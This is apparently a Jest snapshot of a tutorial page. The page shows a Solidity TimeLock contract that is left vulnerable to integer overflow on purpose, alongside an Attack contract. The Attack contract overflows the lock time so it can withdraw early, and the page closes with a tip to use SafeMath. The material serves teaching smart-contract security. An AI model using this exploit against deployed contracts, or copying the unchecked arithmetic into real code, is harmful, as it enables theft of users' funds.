// Jest Snapshot v1, https://goo.gl/fbAQLP

exports[`it renders 1`] = `
<Example
  description="An example of hacking Solidity with arithmetic overflow / underflow"
  html="<h3 id=\\"vulnerability\\">Vulnerability</h3>
<p>Integers in Solidity overflow / underflow without any errors.</p>
<pre><code class=\\"language-solidity\\">pragma solidity ^0.5.16;

// This contract is designed to act as a time vault.
// User can deposit into this contract but cannot withdraw for atleast a week.
// User can also extend the wait time beyond the 1 week waiting period.

/*
1. Deploy TimeLock
2. Deploy Attack with address of TimeLock
3. Call Attack.attack sending 1 ether. You will immediately be able to
   withdraw your ether.

What happened?
Attack caused the TimeLock.lockTime to overflow and was able to withdraw
before the 1 week waiting period.
*/

contract TimeLock {
    mapping(address =&gt; uint) public balances;
    mapping(address =&gt; uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = now + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] &gt; 0, \\"Insufficient funds\\");
        require(now &gt; lockTime[msg.sender], \\"Lock time not expired\\");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call.value(amount)(\\"\\");
        require(sent, \\"Failed to send Ether\\");
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) public {
        timeLock = TimeLock(_timeLock);
    }

    function () external payable {}

    function attack() public payable {
        timeLock.deposit.value(msg.value)();
        timeLock.increaseLockTime(
            uint(-1) - timeLock.lockTime(address(this)) + 1
        );
        timeLock.withdraw();
    }
}
</code></pre>
<h3 id=\\"preventative-techniques\\">Preventative Techniques</h3>
<ul>
<li>Use <a href=\\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol\\" target=\\"__blank\\">SafeMath</a> to will prevent arithmetic overflow and underflow</li>
</ul>
"
  title="Arithmetic Overflow and Underflow"
  version="0.5.16"
/>
`;
